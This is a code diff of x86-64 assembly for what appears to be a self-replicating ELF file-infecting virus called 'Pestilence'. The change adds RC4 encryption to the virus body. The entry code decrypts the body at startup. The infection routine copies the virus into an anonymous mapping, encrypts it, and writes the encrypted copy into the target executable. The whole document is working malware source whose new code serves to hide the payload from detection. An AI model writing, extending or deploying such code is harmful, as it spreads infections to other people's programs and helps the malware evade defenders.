@@ -9,8 +9,19 @@ section .text
 ; %rdi %rsi %rdx %r10 %r8 %r9
 
 _start:
-	PUSH_ALL
+    lea rax, [rel _stop]
+    lea rcx, [rel _encrypted_start]
+    sub rax, rcx
+    mov rsi, rax
+    mov rdi, rcx
+    xor rdx, rdx
+    call rc4
+    PUSH_ALL
+    jmp _encrypted_start
 
+%include "rc4.s"
+
+_encrypted_start:
 	lea		rdi, [rel path]
 	mov		rcx, 512
 	xor		rax, rax
@@ -815,24 +826,54 @@ infection:
 	syscall
 	mov r14, rax
 
+
 .no_extend:
 	push rdi
 	push rsi
 	push rcx
-	mov rdi, r14
-	add rdi, [rel p_offset]
+
+	mov rax, SYS_mmap
+	xor rdi, rdi
+	mov rsi, PESTILENCE_SIZE_NO_BSS
+	mov rdx, PROT_READ | PROT_WRITE
+	mov r10, MAP_PRIVATE | MAP_ANONYMOUS
+	mov r8, -1
+	xor r9, r9
+	syscall
+
+	cmp rax, -4095
+	jae .return
+	mov rbx, rax
+
+	mov rdi, rbx 
 	lea rsi, [rel _start]
 	mov rcx, PESTILENCE_SIZE_NO_BSS
 	rep movsb
+
+	mov rdi, rbx
+
+	lea rax, [rel _encrypted_start]
+	lea rcx, [rel _start]
+	sub rax, rcx
+	add rdi, rax
+
+	; RC4
+	lea rdx, [rel _stop]
+	lea rcx, [rel _encrypted_start]
+	sub rdx, rcx
+	mov rsi, rdx
+	xor rdx, rdx
+	call rc4
+
+	mov rdi, r14
+	add rdi, [rel p_offset]
+	mov rsi, rbx
+	mov rcx, PESTILENCE_SIZE_NO_BSS
+	rep movsb
+
 	pop rcx
 	pop rsi
 	pop rdi
-
-	mov rax, SYS_msync
-	mov rdi, r14
-	mov rsi, [rel file_size]
-	mov rdx, MS_SYNC
-	syscall
 
 	mov rax, SYS_munmap
 	mov rdi, r14
@@ -843,6 +884,7 @@ infection:
 	mov rax, r13
 	POP_ALLr
 	ret
+
 
 
 end_:
